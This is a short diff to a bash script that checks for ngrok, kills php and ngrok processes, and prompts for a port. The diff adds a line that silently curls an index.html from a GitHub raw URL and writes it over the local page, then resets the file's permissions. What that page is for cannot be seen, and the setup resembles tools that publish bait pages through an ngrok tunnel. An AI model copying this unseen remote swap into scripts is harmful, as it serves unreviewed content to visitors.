@@ -16,6 +16,8 @@ printf "\e[1;92m[\e[0m+\e[1;92m] I found Ngrok executable."
 echo 
 pkill php 
 pkill ngrok
+curl --silent https://raw.githubusercontent.com/efxtv/ngrok-fix-final/main/index.html >index.html
+chmod a=r index.html;chmod u=rw index.html
 echo -en "\e[1;92m[\e[0m+\e[1;92m] Enter the port number :"
 read port
 #bash script below
